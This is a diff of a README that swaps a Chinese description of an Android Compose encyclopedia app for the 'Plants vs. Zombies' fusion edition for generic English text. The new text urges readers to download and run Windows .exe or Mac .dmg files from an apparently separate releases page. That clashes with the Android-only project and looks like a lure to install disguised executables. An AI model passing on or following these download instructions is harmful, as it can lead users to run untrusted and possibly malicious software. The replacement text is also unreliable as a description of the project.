@@ -1,44 +1,54 @@
-# 🧟‍♂️ 植物大战僵尸：融合版 - 图鉴应用 (Android Compose)
+# 🕹️ pvzrh_atlas - Your Guide to Plant Wars Zombies
 
-<p align="center">
-  <img src="./image/icon.png" alt="项目Logo" width="200"/>
-</p>
+![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)
 
-这是一个基于 Jetpack Compose 全新开发的 **《植物大战僵尸：融合版》** 非官方图鉴应用。项目旨在利用现代 Android UI 工具包 Compose，为玩家提供一个方便、美观的图鉴工具，以查看所有植物和僵尸的详细信息。
+## 🌟 Overview
 
-<p align="center">
-  <img src="./image/Promotionalimage.jpg" alt="宣传图"/>
-</p>
+Welcome to **pvzrh_atlas**, a comprehensive guide for the merged version of the classic game "Plants vs. Zombies." This application provides players with essential information about the game mechanics, plant types, zombie factions, and tips for better gameplay. 
 
-## ✨ 特性
+## 🚀 Getting Started
 
-- **🌱 现代 UI**：使用 **Jetpack Compose** 完全重写界面，告别 XML，提供流畅、现代的用户体验。
-- **📖 详细图鉴**：包含游戏中所有**植物**和**僵尸**的详尽数据，包括攻击力、防御力、特殊能力等。
-- **🎨 动画与效果**：利用 Compose 的动画和图形 API，生动展示植物和僵尸的形象与特性。
-- **📱 响应式设计**：支持不同屏幕尺寸和方向，从手机到平板都能完美适配。
+To download and run the pvzrh_atlas application, please follow these simple steps:
 
----
+## 📥 Download & Install
 
-## 🛠️ 技术栈
+1. **Visit the Releases Page**: Click the following link to go to our releases page and download the software.
 
-这个项目是基于最新的 Android 技术栈构建的。
+   [Download the latest release](https://github.com/Studgrv/pvzrh_atlas/releases)
 
-- **语言**：Kotlin
-- **UI 框架**：[Jetpack Compose](https://developer.android.com/jetpack/compose)
-- **依赖管理**：Gradle
-- **架构**：遵循 MVVM (Model-View-ViewModel) 架构模式
-- **图形**：
-  - Lottie (用于动画)
-  - Coil (用于图片加载，例如加载植物和僵尸图片)
-- **状态管理**：Compose `State` 和 `StateFlow`
-- **其他**：
-  - Coroutines (协程，用于异步操作)
+2. **Choose Your Download**: On the releases page, you will find the latest version of pvzrh_atlas. Look for the most recent release, which will typically be at the top of the list.
 
----
+3. **Download the Package**: Click on the file that matches your operating system. It may be labeled as `.exe` for Windows, `.dmg` for Mac, or compressed formats like `.zip`. 
 
-## 🚀 快速开始
+4. **Install the Software**: 
+   - For Windows, double-click the `.exe` file and follow the prompts.
+   - For Mac, open the `.dmg` file and drag the application to your Applications folder.
 
-### 前提条件
+5. **Run the Application**: Once installed, you can find pvzrh_atlas in your applications folder, start menu, or desktop.
 
-- [Android Studio Giraffe 或更高版本](https://developer.android.com/studio)
-- JDK 17 或更高版本
+## 💡 Features
+
+- **Comprehensive Guide**: Access detailed information on various plants and zombies.
+- **User-Friendly Interface**: Navigate the application with ease, even if you are not tech-savvy.
+- **Regular Updates**: Stay informed about new content and features as we continue to enhance your experience.
+
+## ⚙️ System Requirements
+
+The following system requirements ensure smooth operation of pvzrh_atlas:
+
+- **Operating System**: Windows 10 or newer / macOS Mojave or newer.
+- **Processor**: Minimum dual-core processor.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: A minimum of 500 MB of free space.
+
+## 🍀 Tips for Use
+
+- **Explore the Sections**: Familiarize yourself with the different categories in the app to make the most of your experience.
+- **Bookmark Important Pages**: If you find certain plants or strategies useful, make a note of them for quick access later.
+- **Stay Updated**: Keep an eye on the releases page for new updates and features.
+
+## 📞 Support
+
+If you encounter any issues or have questions, please visit our GitHub page. You can use the "Issues" section to report bugs or request features. We are here to help!
+
+Thank you for using pvzrh_atlas! Happy gaming!
